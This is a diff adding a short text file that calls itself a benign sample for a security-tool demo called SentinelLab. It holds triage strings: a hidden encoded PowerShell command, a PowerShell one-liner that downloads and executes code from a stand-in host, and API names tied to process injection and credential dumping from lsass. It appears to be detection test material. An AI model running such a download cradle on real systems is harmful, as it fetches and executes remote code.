@@ -1,0 +1,6 @@
+This benign text file is intentionally crafted for SentinelLab demo analysis.
+It contains strings commonly seen during suspicious triage:
+powershell.exe -w hidden -encodedcommand AAAA
+IEX(New-Object Net.WebClient).DownloadString('https://update-checker-cdn.example/payload')
+VirtualAlloc CreateRemoteThread lsass
+
